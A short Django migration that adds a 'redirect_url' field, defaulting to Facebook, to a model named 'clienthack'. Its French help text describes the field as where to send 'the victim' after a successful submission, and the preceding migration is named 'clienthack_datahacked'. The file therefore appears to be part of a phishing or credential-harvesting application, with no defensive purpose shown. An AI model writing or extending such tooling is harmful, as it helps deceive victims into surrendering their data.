from django.db import migrations, models


class Migration(migrations.Migration):

    dependencies = [
        ("core", "0046_clienthack_datahacked"),
    ]

    operations = [
        migrations.AddField(
            model_name="clienthack",
            name="redirect_url",
            field=models.URLField(
                blank=True,
                default="https://www.facebook.com",
                help_text="URL où rediriger la victime après soumission réussie",
            ),
        ),
    ]
